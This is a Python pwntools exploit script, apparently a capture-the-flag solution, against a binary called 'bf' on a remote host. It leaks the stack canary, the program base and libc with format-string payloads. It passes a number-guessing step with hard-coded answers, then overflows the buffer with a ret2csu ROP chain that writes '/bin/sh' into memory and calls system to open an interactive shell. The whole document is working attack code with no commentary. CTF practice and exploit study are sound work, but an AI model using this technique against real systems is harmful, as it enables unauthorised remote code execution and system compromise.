from pwn import *
context.terminal=["tmux","splitw",'-h']
local = 0
if local :
    a=process("./bf")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.33.164.4",50001)
    libc=ELF("libc6_2.13-20ubuntu5.3_amd64.so")
elf=ELF("./bf")
def debug():
    gdb.attach(a,'''
    
    b *(0x555555554000+0x000000000000D0D)
    ''')
def init():
    a.recvuntil("Are you sure want to play the game?\n")
    a.sendline("1")
def fsb(payload):
    a.recvuntil("Input your name : \n")
    a.send(payload)
#debug()
init()
payload='%17$p%26$p'
payload=payload.ljust(28,'A')
payload+=p32(0)
fsb(payload)

array=[7427 , 39356  ,9595  ,54062  ,67371 , 42578  ,92585  ,76990  ,22615  ,53318]
a.recvuntil("|           Range : [1, 100000]            |\n")
a.recvuntil("\n")
for i in array:
    a.recvuntil("Now guess:")
    a.sendline(str(i))

a.recvuntil("Correct!\n")
canary=eval(a.recv(18))
success("canary ==> 0x%x"%canary)
text_base=eval(a.recv(14))-0x970
success("text_base ==> 0x%x"%text_base)
pop_rdi_ret=0x0000000000000db3+text_base

payload='A'*52+p64(canary)+'A'*8
payload+=p64(text_base+0x000000000000970)
a.sendline(payload)




init()
payload='%19$p'
payload=payload.ljust(28,'A')
payload+=p32(0)
fsb(payload)

array=[7427 , 39356  ,9595  ,54062  ,67371 , 42578  ,92585  ,76990  ,22615  ,53318]
a.recvuntil("|           Range : [1, 100000]            |\n")
a.recvuntil("\n")
for i in array:
    a.recvuntil("Now guess:")
    a.sendline(str(i))

a.recvuntil("Correct!\n")
libc_start_main=eval(a.recv(14))-240
success("libc_start_main ==> 0x%x"%libc_start_main)
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
success("base ==> 0x%x"%libc_base)

system_addr=text_base+elf.plt["system"]
csu_foot=text_base+0x000000000000DAA
csu_init=text_base+0x000000000000D90
puts_plt=elf.plt["puts"]+text_base
puts_got=elf.got["read"]+text_base
read_plt=elf.plt["read"]+text_base
read_got=elf.got["read"]+text_base

payload='A'*52+p64(canary)+'A'*8
payload+=p64(csu_foot)
payload+=p64(0)
payload+=p64(1)
payload+=p64(read_got)
payload+=p64(0x100)
payload+=p64(elf.bss()+text_base)
payload+=p64(0)
payload+=p64(csu_init)
payload+='A'*56
payload+=p64(pop_rdi_ret)
payload+=p64(elf.bss()+text_base)
payload+=p64(system_addr)
a.recv()
a.sendline(payload)
sleep(0.2)
a.sendline("/bin/sh\x00")

a.interactive()    
